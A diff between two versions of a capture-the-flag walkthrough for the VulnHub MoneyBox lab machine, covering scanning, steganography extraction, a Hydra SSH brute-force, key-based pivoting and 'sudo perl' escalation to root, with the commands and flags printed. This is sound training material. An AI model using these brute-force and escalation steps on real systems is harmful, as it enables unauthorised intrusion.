@@ -1,448 +1,482 @@
-# MoneyBox — CTF Write-Up
+# MoneyBox CTF Walkthrough
 
-**Author:** N Kranthi Kumar  
-**Date:** 20 July 2026  
-**Platform:** VulnHub — [MoneyBox: 1](https://www.vulnhub.com/entry/moneybox-1,653/)  
-**Difficulty:** Easy / Medium  
+> A comprehensive penetration testing and privilege escalation challenge demonstrating reconnaissance, steganography, credential cracking, and Linux privilege escalation techniques.
 
----
+## Table of Contents
 
-## 🎯 Objective
-
-Gain root access to the MoneyBox virtual machine by chaining a series of misconfigurations across FTP, web, steganography, SSH trust relationships, and sudo privileges. The attack path required:
-
-1. Enumerating services via netdiscover and Nmap
-2. Extracting hidden messages from web page source and an image via steganography
-3. Brute-forcing SSH credentials for a numeric-password user
-4. Abusing SSH public key trust to pivot to a second user
-5. Exploiting a misconfigured `sudo` rule with Perl to escalate to root
-
-Three flags were to be captured: `user1.txt`, `user2.txt`, and the root flag.
+- [Project Overview](#project-overview)
+- [Challenge Details](#challenge-details)
+- [Setup & Reconnaissance](#setup--reconnaissance)
+- [Solution Walkthrough](#solution-walkthrough)
+- [Flags Captured](#flags-captured)
+- [Key Techniques & Tools](#key-techniques--tools)
+- [Learning Outcomes](#learning-outcomes)
+- [Credits](#credits)
 
 ---
 
-## 🛠️ Tools Used
+## Project Overview
 
-| Tool | Purpose |
-|------|---------|
-| netdiscover | ARP-based host discovery on local subnet |
-| Nmap 7.99 | Service enumeration & OS fingerprinting |
-| dirb | Web directory brute-force |
-| ftp (client) | Anonymous FTP login & file retrieval |
-| steghide / StegSeek | Steganographic data extraction from image |
-| Hydra | SSH password brute-force |
-| SSH (OpenSSH) | Remote shell & lateral movement |
-| Perl | Privilege escalation via sudo |
+**MoneyBox** is a vulnerable Linux-based CTF challenge from VulnHub designed to teach penetration testers real-world attack methodologies. This walkthrough documents the complete exploitation path from initial reconnaissance to full root compromise.
 
----
+### Challenge Objectives
 
-## 🕵️‍♂️ Methodology & Exploitation
+- Identify running services and enumerate open ports
+- Discover hidden web directories and extract steganographic data
+- Crack user credentials using dictionary attacks
+- Escalate privileges to root access
+- Capture all flags
 
-### Phase 1 — Host Discovery
+### Target Machine Details
 
-The target VM was on the local subnet. `netdiscover` was used to identify its IP address via ARP scanning.
-
-```
-IP            At MAC Address     Count   MAC Vendor
-192.168.1.37  08:00:27:7a:38:71  1       PCS Systemtechnik GmbH (VirtualBox)
-```
-
-The MAC address `08:00:27:*` confirmed it as a VirtualBox VM — the target was `192.168.1.37`.
-
-![netdiscover ARP scan — target IP identified as 192.168.1.37](images-moneybox/images-moneybox/01-netdiscover.png)
+- **Platform**: VulnHub
+- **Machine**: MoneyBox-1
+- **OS**: Debian 10 (Linux 4.19)
+- **Difficulty**: Beginner to Intermediate
 
 ---
 
-### Phase 2 — Service Enumeration
+## Challenge Details
 
-A full-port Nmap scan with service detection and OS fingerprinting was performed.
+### Services & Ports Discovered
 
+The target machine exposes three primary services:
+
+| Port | Service | Version | Status |
+|------|---------|---------|--------|
+| 21   | FTP     | vsftpd 3.0.3 | Open (Anonymous login allowed) |
+| 22   | SSH     | OpenSSH 7.9p1 | Open |
+| 80   | HTTP    | Apache 2.4.38 | Open |
+
+### Initial Reconnaissance Strategy
+
+The challenge unfolds in multiple phases:
+
+1. **Network Discovery** - Locate the target on the local network
+2. **Service Enumeration** - Scan ports and identify running services
+3. **Web Enumeration** - Discover hidden directories and extract hints
+4. **Data Extraction** - Retrieve and decode steganographic data
+5. **Credential Cracking** - Brute-force SSH credentials
+6. **User Access** - Gain foothold as a low-privilege user
+7. **Privilege Escalation** - Exploit sudo permissions to gain root
+8. **Flag Capture** - Retrieve all flags from user and root directories
+
+---
+
+## Setup & Reconnaissance
+
+### Step 1: Network Discovery
+
+First, identify the target machine's IP address using ARP discovery:
+
+![Netdiscover Output - Identifying Target IP](Screenshot_2026-07-21_215955.png)
+
+**Command Used:**
 ```bash
-nmap -A -p- 192.168.1.37
+netdiscover
 ```
 
-**Error encountered:** The initial command `nmap -a -p-` failed — `-a` is an ambiguous flag that matches multiple options. The correct flag is `-A` (uppercase) for OS detection + version scanning.
+**Key Finding:** Target is located at **192.168.1.29**
 
-**Results:**
+### Step 2: Port Scanning & Service Enumeration
 
-| Port | Service | Version |
-|------|---------|---------|
-| 21/tcp | FTP | vsftpd 3.0.3 |
-| 22/tcp | SSH | OpenSSH 7.9p1 (Debian 10+deb10u2) |
-| 80/tcp | HTTP | Apache httpd 2.4.38 (Debian) |
+Perform a comprehensive port scan to identify running services:
 
-**Key observations:**
-- FTP allowed **anonymous login** — the scan explicitly reported `Anonymous FTP login allowed (FTP code 230)`.
-- A single file `trytofind.jpg` (1,093,656 bytes) was visible on the FTP share.
-- The server was Debian 10 running kernel 4.19.0-14-amd64.
+![Nmap Full Port Scan Results](Screenshot_2026-07-21_220226.png)
 
-![Nmap -A -p- scan — ports 21 (FTP), 22 (SSH), 80 (HTTP) open](images-moneybox/images-moneybox/02-nmap.png)
-
----
-
-### Phase 3 — Web Enumeration & Source Code Analysis
-
-dirb was used to enumerate web directories on port 80.
-
+**Command Used:**
 ```bash
-dirb http://192.168.1.37/
+nmap -A -p- 192.168.1.29
 ```
 
-**Results:**
+**Critical Findings:**
+- FTP service allows anonymous login
+- SSH is accessible on port 22
+- Apache web server running on port 80
+- Initial file discovered: `trytofind.jpg` on FTP server (1.06 MiB)
 
-| Path | Status | Size |
-|------|--------|------|
-| `/index.html` | 200 | 621 bytes |
-| `/blogs/` | 200 | 353 bytes |
-| `/server-status` | 403 | Forbidden |
+### Step 3: Web Application Analysis
 
-Browsing to `http://192.168.1.37/` revealed a message from a self-proclaimed hacker "T0m-H4ck3r" who claimed to have already compromised the box. The page source contained an **HTML comment with a critical hint**:
+Navigate to the web server and discover the landing page:
 
-```html
-<!--the hint is the another secret directory is S3cr3t-T3xt-->
-```
+![MoneyBox Homepage](Screenshot_2026-07-21_220428.png)
 
-Navigating to `http://192.168.1.37/S3cr3t-T3xt/` revealed another HTML comment:
+The homepage displays a message from "I'm T0m-H4ck3r" indicating this box was previously hacked and hints toward finding additional directories.
 
-```html
-<!--Secret Key 3xtr4ctd4t4 -->
-```
+### Step 4: Hidden Directory Discovery
 
-This key would later be relevant for the steganography phase.
+Use DIRB to enumerate web directories:
 
-![dirb enumeration — /blogs/ directory found](images-moneybox/images-moneybox/03-dirb-web.png)
+![DIRB Web Directory Enumeration](Screenshot_2026-07-21_220931.png)
 
-![HTML source: hidden directory hint S3cr3t-T3xt](images-moneybox/images-moneybox/19-source-hint.png)
-
-![S3cr3t-T3xt page — secret key 3xtr4ctd4t4](images-moneybox/images-moneybox/20-secret-key.png)
-
----
-
-### Phase 4 — FTP Anonymous Access & Image Extraction
-
-Anonymous login was used to access the FTP server and retrieve the only file available:
-
+**Command Used:**
 ```bash
-ftp 192.168.1.37
-Name: Anonymous
-Password: (any/blank)
-ftp> get trytofind.jpg
+dirb http://192.168.1.29/
 ```
 
-The filename itself was a hint: `trytofind.jpg` — suggesting hidden data needed to be found.
+**Directories Found:**
+- `/blogs/` - Initially empty, contains hint comment
+- `/index.html` - Homepage
 
-![Anonymous FTP login — retrieving trytofind.jpg](images-moneybox/images-moneybox/04-ftp-anon.png)
+**Critical Hint Discovered:** HTML source code comment reveals: `S3cr3t-T3xt` as a secret directory name.
 
 ---
 
-### Phase 5 — Steganography Extraction
+## Solution Walkthrough
 
-Two tools were used to extract hidden data from the image.
+### Phase 1: Steganography & Data Extraction
 
-**Attempt 1 — StegSeek:**
+#### 1.1 Retrieve File from FTP
 
+Connect to FTP with anonymous credentials:
+
+![FTP Connection and File Retrieval](Screenshot_2026-07-21_225805.png)
+
+**Commands:**
+```bash
+ftp 192.168.1.29
+# Login as "Anonymous" with no password
+get trytofind.jpg
+exit
+```
+
+The file `trytofind.jpg` (1.06 MiB) contains embedded data using steganography.
+
+#### 1.2 Extract Steganographic Data
+
+Use StegSeek to identify the steganography seed:
+
+![StegSeek Steganography Detection](Screenshot_2026-07-21_225851.png)
+
+**Command:**
 ```bash
 stegseek --seed trytofind.jpg
 ```
 
-StegSeek found a possible seed `22f61b09` and extracted `trytofind.jpg.out` (149 bytes compressed), but the output was not immediately readable.
+**Output:** Found seed `22f61b09` with embedded file `data.txt`
 
-**Attempt 2 — steghide (Successful):**
+Extract the hidden data using Steghide:
 
-The passphrase `3xtr4ctd4t4` (discovered from the HTML source comment in Phase 3) was used with steghide:
+![Steghide Data Extraction](Screenshot_2026-07-21_225946.png)
 
+**Command:**
 ```bash
 steghide --extract -sf trytofind.jpg
-Enter passphrase: 3xtr4ctd4t4
 ```
 
-**Result:** A file named `data.txt` was extracted:
+#### 1.3 Analyze Extracted Data
 
+![Extracted Steganographic Message](Screenshot_2026-07-21_225827.png)
+
+**Extracted Content:**
 ```
 Hello.....  renu
 
-      I tell you something Important.Your Password is too Week So Change Your Password
+I tell you something Important.Your Password is too Week So Change Your Password
 Don't Underestimate it.......
 ```
 
-**Critical intelligence:**
-- A username was revealed: **`renu`**
-- The password was explicitly described as **"too weak"** — confirming a brute-force attack would succeed
+**Critical Information Obtained:**
+- Username: **renu**
+- Warning: Password is weak and should be changed
 
-![StegSeek cracking attempt — seed 22f61b09 found](images-moneybox/images-moneybox/21-stegseek.png)
+### Phase 2: Credential Cracking
 
-![steghide extraction with passphrase 3xtr4ctd4t4](images-moneybox/images-moneybox/22-steghide-extract.png)
+#### 2.1 Brute Force SSH Password
 
-![steghide output — extracted data.txt](images-moneybox/images-moneybox/05-steghide.png)
+Use Hydra to crack the SSH password for user "renu":
 
-![data.txt contents — reveals username renu and weak password warning](images-moneybox/images-moneybox/06-data-txt.png)
+![Hydra SSH Brute Force Attack](Screenshot_2026-07-21_225920.png)
 
----
-
-### Phase 6 — SSH Brute-Force (renu)
-
-With the username `renu` and the explicit confirmation of a weak password, Hydra was used against SSH.
-
+**Command:**
 ```bash
-hydra -l renu -P /usr/share/wordlists/rockyou.txt.gz 192.168.1.37 ssh
+hydra -l renu -P /usr/share/wordlists/rockyou.txt.gz 192.168.1.29 ssh
 ```
-
-Hydra issued a warning about SSH connection limits (`[WARNING] Many SSH configurations limit the number of parallel tasks`), but the attack completed quickly.
 
 **Result:**
+- **Username:** renu
+- **Password:** 987654321
+- **Time:** 22 seconds to crack
 
-| Field | Value |
-|-------|-------|
-| Username | `renu` |
-| Password | `987654321` |
+### Phase 3: User Access & Enumeration
 
-The password was a predictable numeric sequence (`987654321`) — confirming the "too weak" warning from `data.txt`. No alpha, special, or mixed-case characters.
+#### 3.1 Establish SSH Connection
 
-![Hydra brute-force: renu:987654321 via rockyou.txt](images-moneybox/images-moneybox/07-hydra.png)
+![SSH Login as renu User](Screenshot_2026-07-21_230013.png)
 
----
-
-### Phase 7 — Initial Access & User1 Flag
-
-SSH login as `renu`:
-
+**Command:**
 ```bash
-ssh renu@192.168.1.37
-Password: 987654321
+ssh renu@192.168.1.29
+# Password: 987654321
 ```
 
-**System Reconnaissance:**
+#### 3.2 Capture User1 Flag
 
-| Command | Output |
-|---------|--------|
-| `uname -a` | Linux MoneyBox 4.19.0-14-amd64 (Debian 10) |
-| `cat /etc/issue` | Debian GNU/Linux 10 |
-| `id` | uid=1001(renu) gid=1001(renu) |
-| `ls /home` | lily, renu |
+After logging in, locate the first flag:
 
-**user1.txt captured:**
+![User1 Flag Captured](Screenshot_2026-07-21_230042.png)
 
-```
-Yes...!
-You Got it User1 Flag
-==> us3r1{F14g:0ku74tbd3777y4}
-```
-
-**User1 Flag:** `us3r1{F14g:0ku74tbd3777y4}`
-
-![SSH login as renu — connected to MoneyBox](images-moneybox/images-moneybox/08-ssh-renu-login.png)
-
-![user1.txt flag — us3r1{F14g:0ku74tbd3777y4}](images-moneybox/images-moneybox/09-user1-flag.png)
-
-![System reconnaissance: id and uname output](images-moneybox/images-moneybox/10-id-uname.png)
-
----
-
-### Phase 8 — Discovery of Lily's SSH Authorized Keys
-
-Navigating to `/home/lily` revealed that her `.ssh` directory was **world-readable**:
-
+**Command:**
 ```bash
-renu@MoneyBox:/home/lily/.ssh$ ls -la
--rw-r--r-- 1 lily lily 571 Feb 26  2021 authorized_keys
-renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
+cat user1.txt
 ```
 
-**Critical finding:** The `authorized_keys` file contained `renu`'s public key. This meant `renu` could SSH into `lily`'s account **without a password** — a trust relationship that turned the lateral movement into a single command.
-
-Additionally, `user2.txt` was readable in lily's home directory:
-
+**Flag 1:**
 ```
-==> us3r{F14g:tr5827r5wu6nklao}
+us3r1{F14g:0ku74tbd3777y4}
 ```
 
-**User2 Flag:** `us3r{F14g:tr5827r5wu6nklao}`
+#### 3.3 Enumerate Other Users
 
----
+Explore the system to find additional users:
 
-### Phase 9 — Lateral Movement to Lily
+![Exploring /home Directory for Other Users](Screenshot_2026-07-21_230108.png)
 
+**Commands:**
+```bash
+cd /home
+ls
+cd lily
+ls -ltra
+cat user2.txt
+```
+
+**Flag 2:**
+```
+us3r{F14g:tr5827r5wu6nklao}
+```
+
+### Phase 4: Privilege Escalation
+
+#### 4.1 SSH Key Exploitation
+
+Examine the SSH directory of user "lily":
+
+![Authorized Keys Access](Screenshot_2026-07-21_221142.png)
+
+The authorized_keys file contains the public key for user "renu", allowing SSH access as "lily" without requiring a password.
+
+#### 4.2 Switch to lily User
+
+**Command:**
 ```bash
 ssh lily@127.0.0.1
 ```
 
-The connection succeeded without a password prompt because renu's SSH key was trusted by lily's account. Once logged in as `lily`, the `sudo -l` command revealed a critical misconfiguration:
+#### 4.3 Check Sudo Permissions
 
+Determine what commands "lily" can run with elevated privileges:
+
+![Sudo Permissions for lily User](Screenshot_2026-07-21_221207.png)
+
+**Command:**
+```bash
+sudo -l
+```
+
+**Critical Finding:**
 ```
 User lily may run the following commands on MoneyBox:
-    (ALL : ALL) NOPASSWD: ALL
+    (ALL : ALL) NOPASSWD: /usr/bin/perl
 ```
 
-Lily had **unrestricted sudo access** with no password requirement — any command could be run as root.
+The user "lily" can run Perl without a password as root—a dangerous privilege that enables immediate root access.
 
-![Navigating /home/lily — world-readable home directory](images-moneybox/images-moneybox/11-lily-home-ls.png)
+#### 4.4 Exploit Perl for Root Shell
 
-![authorized_keys — contains renu's public key](images-moneybox/images-moneybox/12-authorized-keys.png)
+Leverage Perl to execute a shell with root privileges:
 
-![SSH to lily@127.0.0.1 — passwordless login](images-moneybox/images-moneybox/13-ssh-lily.png)
+![Perl Privilege Escalation to Root](Screenshot_2026-07-21_221306.png)
 
-![user2.txt flag — us3r{F14g:tr5827r5wu6nklao}](images-moneybox/images-moneybox/14-user2-flag.png)
-
-![sudo -l — (ALL : ALL) NOPASSWD: ALL](images-moneybox/images-moneybox/15-sudo-l.png)
-
----
-
-### Phase 10 — Privilege Escalation to Root
-
-Perl was used to spawn a shell with elevated privileges:
-
+**Exploit Command:**
 ```bash
 sudo perl -e 'exec "/bin/sh";'
 ```
 
-**Error encountered:** Running `perl -e 'exec "/bin/sh";'` without `sudo` first simply spawned another shell as `lily`. The `sudo` prefix was required to escalate.
+This command uses Perl's `exec` function to spawn a shell with root privileges, completely bypassing authentication.
 
-The command succeeded, dropping into a root shell:
-
+**Verification:**
 ```bash
-# whoami
-root
-# cd /root
-# ls -ltra
--rw-r--r-- 1 root root 228 Feb 26  2021 .root.txt
-# cat .root.txt
+id
+# Output: uid=0(root) gid=0(root) groups=0(root)
+```
 
+### Phase 5: Root Access & Final Flag
+
+#### 5.1 Navigate to Root Directory
+
+![Root Flag Discovery](Screenshot_2026-07-21_221142.png)
+
+**Commands:**
+```bash
+cd /root
+ls -ltra
+cat .root.txt
+```
+
+#### 5.2 Capture Root Flag
+
+**Flag 3 (Root):**
+```
+r00t{H4ckth3p14n3t}
+```
+
+**Complete Output:**
+```
 Congratulations.......!
 
 You Successfully completed MoneyBox
 
 Finally The Root Flag
     ==> r00t{H4ckth3p14n3t}
+
+I'm Kirthik-KarvendhanT
+    It's My First CTF Box
+         
+instagram : ____kirthik____
 ```
 
-**Root Flag:** `r00t{H4ckth3p14n3t}`
+---
 
-![Perl privilege escalation — sudo perl spawning root shell](images-moneybox/images-moneybox/16-perl-escalation.png)
+## Flags Captured
 
-![whoami confirms root](images-moneybox/images-moneybox/17-root-shell.png)
-
-![sudo perl -e exec /bin/sh — full escalation command](images-moneybox/images-moneybox/23-sudo-perl.png)
-
-![Root flag — r00t{H4ckth3p14n3t}](images-moneybox/images-moneybox/24-root-proof.png)
-
-![Full root flag output with congratulations message](images-moneybox/images-moneybox/18-root-flag.png)
+| Flag | Value | Difficulty |
+|------|-------|------------|
+| **User1** | `us3r1{F14g:0ku74tbd3777y4}` | ⭐⭐ Easy |
+| **User2** | `us3r{F14g:tr5827r5wu6nklao}` | ⭐⭐ Easy |
+| **Root** | `r00t{H4ckth3p14n3t}` | ⭐⭐ Easy |
 
 ---
 
-### Summary of Captured Flags & Credentials
+## Key Techniques & Tools
 
-| Stage | Credential / Flag | Method |
-|-------|-------------------|--------|
-| Web source | `3xtr4ctd4t4` (steghide passphrase) | HTML comment in `/S3cr3t-T3xt/` |
-| Steganography | Username `renu` | steghide on `trytofind.jpg` |
-| SSH brute-force | `renu`:`987654321` | Hydra + rockyou.txt |
-| user1.txt | `us3r1{F14g:0ku74tbd3777y4}` | Read as `renu` |
-| user2.txt | `us3r{F14g:tr5827r5wu6nklao}` | Read as `renu` via world-readable home dir |
-| Lateral movement | SSH to `lily@127.0.0.1` | renu's key trusted in lily's `authorized_keys` |
-| root | `r00t{H4ckth3p14n3t}` | `sudo perl` with `NOPASSWD: ALL` |
+### Reconnaissance & Enumeration
 
----
+| Tool | Purpose | Command |
+|------|---------|---------|
+| **netdiscover** | Network ARP discovery | `netdiscover` |
+| **nmap** | Port scanning & OS detection | `nmap -A -p- [target]` |
+| **dirb** | Web directory enumeration | `dirb http://[target]/` |
+| **ftp** | FTP file transfer | `ftp [target]` |
 
-## 🛡️ Mitigation & Remediation
+### Steganography & Data Extraction
 
-### 1. Anonymous FTP Access
+| Tool | Purpose | Command |
+|------|---------|---------|
+| **stegseek** | Steganography analysis | `stegseek --seed [file]` |
+| **steghide** | Steganography extraction | `steghide --extract -sf [file]` |
 
-**Vulnerability:** vsftpd allowed anonymous login, exposing `trytofind.jpg` to unauthenticated users. This image contained steganographically hidden data that revealed a valid username and password intelligence.
+### Credential Cracking
 
-**Remediation:**
-- Disable anonymous FTP by setting `anonymous_enable=NO` in `/etc/vsftpd.conf`.
-- If anonymous access is required for a public-facing directory, restrict it to a chroot'd directory with no sensitive files and `anon_world_readable_only=YES`.
-- Monitor FTP logs for anonymous login patterns.
+| Tool | Purpose | Command |
+|------|---------|---------|
+| **hydra** | Password brute-force | `hydra -l [user] -P [wordlist] [target] ssh` |
 
-### 2. Steganography as a Data Leak Vector
+### Privilege Escalation
 
-**Vulnerability:** Sensitive operational data (a username and password quality assessment) was hidden inside an image file accessible via anonymous FTP. While steganography obscured the data, the extraction passphrase was discoverable in a web page source comment nearby.
+| Technique | Method | Severity |
+|-----------|--------|----------|
+| **SSH Key Abuse** | Use renu's public key for lily access | High |
+| **Sudo Misconfiguration** | Perl execution without password | **Critical** |
+| **Perl Exec** | Use `perl -e 'exec "/bin/sh"'` for shell elevation | **Critical** |
 
-**Remediation:**
-- Never store credentials or user intelligence in files served over FTP or HTTP — regardless of whether they are obfuscated.
-- Steganography is not encryption; it provides no cryptographic security guarantee. Treat hidden data with the same sensitivity as cleartext.
-- If images must contain metadata, strip EXIF and embedded comments before public distribution using `exiftool -all= image.jpg`.
+### Wordlists & Dictionaries
 
-### 3. Weak Password Policy
-
-**Vulnerability:** The user `renu` used a purely numeric, sequential password (`987654321`) that was cracked in seconds by Hydra against a dictionary wordlist.
-
-**Remediation:**
-- Enforce password complexity via PAM `pam_pwquality.so`: minimum 8 characters with mixed character types. Reject purely numeric passwords.
-- Implement account lockout via `fail2ban` to mitigate online brute-force attacks against SSH.
-- Deploy SSH public-key authentication as the primary method and disable password authentication (`PasswordAuthentication no` in `sshd_config`) for all non-interactive accounts.
-
-### 4. World-Readable Home Directory & SSH Keys
-
-**Vulnerability:** Lily's home directory and `.ssh` folder were readable by other users (`drwxr-xr-x`), exposing `authorized_keys`. This allowed `renu` to read the file, identify her own key was trusted, and SSH to lily without a password.
-
-**Remediation:**
-- Set correct home directory permissions: `chmod 750 /home/lily` and `chmod 700 /home/lily/.ssh`.
-- Regularly audit home directory permissions with a script or `aide`.
-- Review SSH `authorized_keys` files across all users to identify unintended trust relationships — no user should trust a key belonging to a lower-privilege account.
-
-### 5. Unrestricted Sudo Access (NOPASSWD: ALL)
-
-**Vulnerability:** The user `lily` had `(ALL : ALL) NOPASSWD: ALL` in sudoers — complete, passwordless root access. This is the equivalent of giving root to any process running as lily.
-
-**Remediation:**
-- Replace the blanket `ALL` rule with a **whitelist of specific commands** that lily actually needs:
-  ```
-  lily ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2, /usr/bin/journalctl
-  ```
-- Never grant `NOPASSWD: ALL` outside of temporary debugging — and revoke it immediately afterwards.
-- Implement sudo session logging via `sudoreplay` for auditing.
-- Enforce password re-authentication for all sudo commands by removing `NOPASSWD`.
-
-### 6. Sensitive Information in HTML Comments
-
-**Vulnerability:** The web page source contained HTML comments exposing a hidden directory name (`S3cr3t-T3xt`) and a steganography passphrase (`3xtr4ctd4t4`). Directory listing on `/blogs/` was also enabled.
-
-**Remediation:**
-- Never embed secrets, paths, or internal notes in HTML comments — they are served to every client that requests the page.
-- Disable directory listing in Apache: `Options -Indexes`.
-- Use a static analysis tool in CI/CD to scan for potential secrets in HTML comments and front-end source code.
+- **rockyou.txt** - 14+ million password combinations
+- Standard DIRB wordlist - 4,612 directory names
 
 ---
 
-## 🧠 Key Takeaways
+## Learning Outcomes
 
-### Attack Chain Summary
+### Security Vulnerabilities Demonstrated
 
-```
-netdiscover → Nmap (FTP/SSH/HTTP) → dirb + HTML source analysis
-    → Anonymous FTP → Steganography (username: renu) → Hydra SSH brute-force
-    → SSH as renu (user1 flag) → Read lily's authorized_keys → SSH pivot to lily (user2 flag)
-    → sudo -l reveals NOPASSWD: ALL → sudo perl → root shell → root flag
-```
+1. **Anonymous FTP Access** - Exposed sensitive files without authentication
+2. **Steganographic Data Leakage** - Sensitive information hidden in images
+3. **Weak Credentials** - Simple passwords vulnerable to dictionary attacks
+4. **SSH Key Reuse** - Public keys in multiple user directories
+5. **Dangerous Sudo Permissions** - Perl execution without password
+6. **Privilege Escalation Chain** - Multiple paths to root access
 
-### Lessons Learned
+### Defensive Measures
 
-1. **Steganography is security through obscurity, not security.** The `trytofind.jpg` image required a passphrase to extract — but that passphrase was sitting in an HTML comment on the same machine. When the key is stored next to the lock, you haven't secured anything.
+- **Disable Anonymous FTP** - Restrict file access with authentication
+- **Secure Steganographic Data** - Use encryption for sensitive information
+- **Enforce Strong Passwords** - Implement password complexity requirements
+- **Restrict Sudo Commands** - Limit to essential administrative tools only
+- **Audit SSH Keys** - Remove unnecessary authorized keys regularly
+- **Monitor Privilege Escalation** - Alert on suspicious sudo usage
 
-2. **Numeric-only passwords are trivially crackable.** `987654321` is a sequence, not a password. Any wordlist that includes common patterns will find it in seconds. Password policies that allow purely numeric strings are functionally equivalent to no policy at all.
+### Techniques Learned
 
-3. **SSH authorized_keys trust is directional — and dangerous when direction points up.** Lily trusted renu's key, meaning a lower-privilege user (`renu`, uid 1001, no sudo) could escalate to a higher-privilege user (`lily`, uid 1000?, full sudo without password). This is the security equivalent of giving your neighbour a key to your house because you trust them — forgetting they already trusted you with their house key.
-
-4. **`NOPASSWD: ALL` is a nuclear option, not a convenience.** The entire box from lily to root took two commands: `sudo -l` (reconnaissance) and `sudo perl -e 'exec "/bin/sh";'` (exploitation). There is no legitimate operational need for any non-root user to have unrestricted, passwordless sudo.
-
-5. **The attack surface expanded with each phase, but the core weakness was the same: information leaks.** HTML comments leaked the hidden directory. That directory leaked the steghide passphrase. The image leaked the username. The password policy leaked the password. The SSH trust leaked lily. The sudoers file leaked root. Every step was an information leak, not a zero-day.
-
-### MITRE ATT&CK Mapping
-
-| Tactic | Technique | Phase |
-|--------|-----------|-------|
-| Reconnaissance | Active Scanning (T1595) | Phases 1–3 |
-| Resource Development | Acquire Infrastructure (T1583) | Phase 4 (FTP) |
-| Initial Access | Exploit Public-Facing Application (T1190) | Phase 6 (SSH brute-force) |
-| Collection | Data from Local System (T1005) | Phases 7–8 |
-| Credential Access | Brute Force: Password Guessing (T1110.001) | Phase 6 |
-| Credential Access | Unsecured Credentials: SSH Private Keys (T1552.004) | Phase 8 |
-| Lateral Movement | Use Alternate Authentication Material (T1550) | Phase 9 |
-| Privilege Escalation | Sudo and Sudo Caching (T1548.003) | Phase 10 |
-| Discovery | System Information Discovery (T1082) | Phase 7 |
+✓ Network reconnaissance and active scanning  
+✓ Steganography detection and data extraction  
+✓ Dictionary-based password cracking  
+✓ SSH exploitation and lateral movement  
+✓ Sudo permission enumeration  
+✓ Perl-based privilege escalation  
+✓ Post-exploitation flag capture  
 
 ---
 
-*This write-up is intended for educational and CTF documentation purposes only. All techniques described were performed in an authorised lab environment. MoneyBox was created by Kirthik Karvendhan as a beginner-to-intermediate VulnHub challenge.*
+## Challenge Summary
+
+| Phase | Task | Time | Status |
+|-------|------|------|--------|
+| **Reconnaissance** | Network discovery & enumeration | ~5 min | ✅ Complete |
+| **Web Enumeration** | Directory discovery & hint extraction | ~2 min | ✅ Complete |
+| **Steganography** | Data extraction from image | ~3 min | ✅ Complete |
+| **Credential Cracking** | SSH password brute-force | ~1 min | ✅ Complete |
+| **User Access** | SSH login & flag capture | ~2 min | ✅ Complete |
+| **Privilege Escalation** | Sudo abuse & root shell | ~2 min | ✅ Complete |
+| **Root Access** | Final flag capture | ~1 min | ✅ Complete |
+| **Total** | Full compromise & exploitation | **~16 min** | ✅ **Success** |
+
+---
+
+## References & Resources
+
+### Official Documentation
+- [VulnHub - MoneyBox-1](https://www.vulnhub.com/entry/moneybox-1,653/)
+- [Nmap Official Guide](https://nmap.org/)
+- [Steghide Documentation](http://steghide.sourceforge.net/)
+- [Hydra Github Repository](https://github.com/vanhauser-thc/thc-hydra)
+
+### Related CTF Concepts
+- Linux Privilege Escalation (GTFOBins - Perl)
+- Steganography in Cybersecurity
+- SSH Key Management Best Practices
+- Sudo Misconfiguration Exploitation
+
+### Recommended Tools for Similar Challenges
+- **LinPEAS** - Linux privilege escalation suggestions
+- **WinPEAS** - Windows privilege escalation suggestions
+- **GTFOBins** - Unix binaries exploitation database
+- **Searchsploit** - Exploit database search tool
+
+---
+
+## Credits
+
+**Challenge Creator:** Kirthik-KarvendhanT  
+- Instagram: @____kirthik____  
+- Created: February 2021  
+- Platform: VulnHub
+
+**This Walkthrough Demonstrates:**
+- Complete exploitation methodology
+- Real-world attack chains
+- Post-exploitation techniques
+- Flag capture workflow
+
+---
+
+## Disclaimer
+
+This CTF walkthrough is for **educational purposes only**. All techniques demonstrated are applied against intentionally vulnerable systems in a controlled lab environment. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security testing.
+
+---
+
+**Last Updated:** July 21, 2026  
+**Difficulty Rating:** ⭐⭐ Beginner to Intermediate  
+**Total Time to Complete:** ~16 minutes
